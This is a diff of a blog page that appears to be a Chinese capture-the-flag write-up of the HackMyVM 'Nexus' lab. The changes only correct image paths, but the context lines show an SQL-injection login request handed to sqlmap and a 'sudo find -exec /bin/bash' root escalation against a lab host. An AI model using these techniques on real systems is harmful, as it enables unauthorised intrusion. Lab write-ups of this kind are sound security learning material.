@@ -26,18 +26,18 @@
 <meta property="og:site_name" content="Skyarrow&#39;s blog">
 <meta property="og:description" content="入门sql靶机。 靶机IP：192.168.56.118 信息收集 nmap： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273nmap -T4 -A -v 192.168.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Nexus/vmware_cYvLnbBM6W.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Nexus/vmware_8mQiP65Dni.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Nexus/vmware_YOFEbnNlEY.png">
-<meta property="og:image" content="http://example.com/HackMyVM-Nexus/vmware_o7GAUboN0z.png">
+<meta property="og:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png">
+<meta property="og:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/vmware_cYvLnbBM6W.png">
+<meta property="og:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/vmware_8mQiP65Dni.png">
+<meta property="og:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/vmware_YOFEbnNlEY.png">
+<meta property="og:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/vmware_o7GAUboN0z.png">
 <meta property="article:published_time" content="2025-06-12T03:04:19.000Z">
 <meta property="article:modified_time" content="2025-06-12T09:04:35.257Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="HVM">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png">
+<meta name="twitter:image" content="http://example.com/2025/06/12/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -321,12 +321,12 @@
 <p>访问login.php和index.html都没东西，访问index2.php.</p>
 <p>好炫酷的界面。。。。</p>
 <p>乱点一通之后得到一个信息，提示我们访问auth-login.php。</p>
-<p><img src="/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/HackMyVM-Nexus/msedge_XqWogGcPyw-1749719066875-1.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h3><hr>
 <p>访问之后是个登录界面，抓包看一下登录参数，试用常用轻型字典爆破无果。</p>
-<p><img src="/HackMyVM-Nexus/vmware_cYvLnbBM6W.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/HackMyVM-Nexus/vmware_cYvLnbBM6W.png" srcset="/img/loading.gif" lazyload></p>
 <p>密码加个单引号，发现sql报错。</p>
-<p><img src="/HackMyVM-Nexus/vmware_8mQiP65Dni.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/HackMyVM-Nexus/vmware_8mQiP65Dni.png" srcset="/img/loading.gif" lazyload></p>
 <p>直接丢给sqlmap。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;1.txt</span><br>POST /login.php HTTP/1.1<br>Host: 192.168.56.118<br>Content-Length: 18<br>Cache-Control: max-age=0<br>Accept-Language: en-US,en;q=0.9<br>Origin: http://192.168.56.118<br>Content-Type: application/x-www-form-urlencoded<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://192.168.56.118/auth-login.php<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>user=admin&amp;pass=1&#x27;<br></code></pre></td></tr></table></figure>
 
@@ -346,9 +346,9 @@
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shelly<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:~/SA</span><span class="hljs-variable">$ </span>sudo /usr/bin/find / -exec /bin/bash \;<br><span class="hljs-symbol">sudo:</span> unable to resolve host <span class="hljs-symbol">NexusLabCTF:</span> <span class="hljs-title class_">Fallo</span> temporal en la resolución del nombre<br>root<span class="hljs-variable">@NexusLabCTF</span><span class="hljs-symbol">:/home/shelly/SA</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>只是它的rootflag藏在图片里，转成base64复制过来解码也行，直接从靶机下下来010或者啥隐写工具也行。</p>
-<p><img src="/HackMyVM-Nexus/vmware_YOFEbnNlEY.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/HackMyVM-Nexus/vmware_YOFEbnNlEY.png" srcset="/img/loading.gif" lazyload></p>
 <p>不过最简单粗暴的方法就是直接cat，因为它直接把flag放在末尾了。</p>
-<p><img src="/HackMyVM-Nexus/vmware_o7GAUboN0z.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/HackMyVM-Nexus/vmware_o7GAUboN0z.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
